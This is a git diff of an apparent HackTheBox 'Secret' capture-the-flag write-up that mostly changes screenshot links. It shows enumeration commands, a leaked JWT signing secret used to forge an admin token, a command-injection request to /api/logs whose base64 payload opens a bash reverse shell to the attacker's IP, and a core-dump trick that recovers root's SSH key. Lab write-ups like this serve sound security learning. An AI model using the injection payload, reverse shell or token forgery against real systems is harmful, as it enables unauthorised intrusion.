@@ -1,13 +1,13 @@
-![](secret%20logo.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/secret%20logo.png)
 
 ## nmap all ports
-![](Secret/screenshots/nmap%20all%20ports.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/nmap%20all%20ports.png)
 
 ## nmap services + versions
-![](Secret/screenshots/nmap%20services%20and%20versions.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/nmap%20services%20and%20versions.png)
 
 ## gobuster main
-![](Secret/screenshots/gobuster%20main.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/gobuster%20main.png)
 
 ## wfuzz main/api
 ````bash
@@ -15,12 +15,12 @@ wfuzz -w /opt/tools/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11
 
 `````
 
-![](wfuzz%20%20api.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/wfuzz%20%20api.png)
 
 ## domain main
-![](domain%20main.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/domain%20main.png)
 
-![](dumbdocs%20register%20user.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/dumbdocs%20register%20user.png)
 
 ### create user xenotim
 ````
@@ -61,44 +61,20 @@ Content-Type: application/json
   }
 
 `````
-![](burpsuite%20register%20user.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burpsuite%20register%20user.png)
 
 ### login as xenotim
-![](burp%20logins%20as%20xenotim%20and%20get%20jwt%20tokken.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burp%20logins%20as%20xenotim%20and%20get%20jwt%20tokken.png)
 ````
-![](secret%20logo.png)
-
-## nmap all ports
-![](Secret/screenshots/nmap%20all%20ports.png)
-
-## nmap services + versions
-![](Secret/screenshots/nmap%20services%20and%20versions.png)
-
-## gobuster main
-![](Secret/screenshots/gobuster%20main.png)
-
-## wfuzz main/api
-````bash
-wfuzz -w /opt/tools/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.120/api/FUZZ --hh 93
-
-`````
-
-![](wfuzz%20%20api.png)
-
-## domain main
-![](domain%20main.png)
-
-![](dumbdocs%20register%20user.png)
-
 ### create user xenotim
 ````
 /api/user/register
 
 `````
-![](burpsuite%20register%20user.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burpsuite%20register%20user.png)
 
 ### login as xenotim
-![](burp%20logins%20as%20xenotim%20and%20get%20jwt%20tokken.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burp%20logins%20as%20xenotim%20and%20get%20jwt%20tokken.png)
 ````
 /api/user/login
 
@@ -110,17 +86,17 @@ auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzNhZmNmMzFjYWVlYjA
 `````
 
 
-![](access%20private%20route.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/access%20private%20route.png)
 
 ### access private route
-![](login%20succesfull.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/login%20succesfull.png)
 
 
 ### web app source code
-![](wep%20app%20source%20code%20folders%20+%20files.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/wep%20app%20source%20code%20folders%20%2B%20files.png)
 
 ### git show commits
-![](git%20history%20commits.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/git%20history%20commits.png)
 ### git viewing and accessing commit history
 ````
 git log
@@ -130,7 +106,7 @@ git show 67d8da7a0e53d8fadeb6b
 `````
 
 ### jwt secret key
-![](token%20secret%20on%20git%20commits%20history.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/token%20secret%20on%20git%20commits%20history.png)
 
 ### secret
 ````
@@ -140,13 +116,12 @@ gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuT
 
 ### burpsuite change user account by editing the jwt token by jwt.io
 ### input secret key and you can change to any user you want
-![](burpsuite%20manipulate%20jwt%20token.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burpsuite%20manipulate%20jwt%20token.png)
 
-![](burpsuite%20user%20changed.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burpsuite%20user%20changed.png)
 
 ### git show -p
-![](git%20history%20logs.png)
-XXXXXXXXxxxx
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/git%20history%20logs.png)
 
 `````
 ### jwt tokken
@@ -156,27 +131,27 @@ auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzNhZmNmMzFjYWVlYjA
 `````
 
 
-![](access%20private%20route.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/access%20private%20route.png)
 
 ### acces private route
 ### use GET method
-![](login%20succesfull.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/login%20succesfull.png)
 
 ### jwt.io name = xenotim
 
-![](jwt.io%20jwt%20token%20name%20xenotim.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/jwt.io%20jwt%20token%20name%20xenotim.png)
 
 ### name changed to theadmin with secret key we obtained
 ### jwt token of theadmin
-![](jason%20web%20token%20(jwt)%20change%20user.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/jason%20web%20token%20(jwt)%20change%20user.png)
 
 
 
 ### code review 
-![](wep%20app%20source%20code%20folders%20+%20files.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/wep%20app%20source%20code%20folders%20%2B%20files.png)
 
 ### git
-![](git%20history%20commits.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/git%20history%20commits.png)
 ### git viewing commit hystory
 ````
 git log
@@ -186,7 +161,7 @@ git show 67d8da7a0e53d8fadeb6b
 `````
 
 ### jwt secret key
-![](token%20secret%20on%20git%20commits%20history.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/token%20secret%20on%20git%20commits%20history.png)
 
 ````
 gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
@@ -195,12 +170,12 @@ gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuT
 
 ### burpsuite change user account by editing the jwt token by jwt.io
 ### input secret key and you can change to any user you want
-![](burpsuite%20manipulate%20jwt%20token.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burpsuite%20manipulate%20jwt%20token.png)
 
-![](burpsuite%20user%20changed.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burpsuite%20user%20changed.png)
 
 ### git show -p
-![](git%20history%20logs.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/git%20history%20logs.png)
 
 ### routes private.js
 Routing refers to how an application’s endpoints (URIs) respond to client requests
@@ -270,10 +245,10 @@ exec(getLogs, (err , output) =>{
 
 
 ### /logs?file=hello
-![](burp%20file%20parameter.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burp%20file%20parameter.png)
 
 ### parameter file command execution
-![](burp%20file%20parameter%20command%20execution.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burp%20file%20parameter%20command%20execution.png)
 
 ### shell as user dasith
 ````bash
@@ -288,40 +263,41 @@ GET /api/logs?file=hello;echo+-n+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xM
 `````
 
 ### reverse shell as dasith
-![](burp%20reverse%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/burp%20reverse%20shell.png)
 
 ### user.txt
-![](Secret/screenshots/user.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/user.txt.png)
 
 ### find suid
-![](find%20suid.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/find%20suid.png)
 
 ### core dump c
-![](coredump%20function%20c.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/coredump%20function%20c.png)
 
 ### core dump to get /root/.ssh/id_rsa
-![](core%20dump%20id_rsa.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/core%20dump%20id_rsa.png)
 
 ### shell 1 run count 
-![](shell%20dasith%20run%20count.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/shell%20dasith%20run%20count.png)
 
 ### core dump successfull
-![](core%20dump%20successfull.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/core%20dump%20successfull.png)
 
 ### make coredump readable
 ````
 apport-unpack
 
 `````
-![](core%20dump%20prettify%20output.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/core%20dump%20prettify%20output.png)
+
 ### strings on it and output to file and grep for ssh-key
-![](strings%20coredump.png)
-![](Pasted%20image%2020221005213643.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/strings%20coredump.png)
+
 ### scp file transfer root-id_rsa 
-![](scp%20file%20transfer.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/scp%20file%20transfer.png)
 
 ### root.txt
-![](Secret/screenshots/root.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Secret/screenshots/root.txt.png)
 
 
 XXXXXXXXxxxx
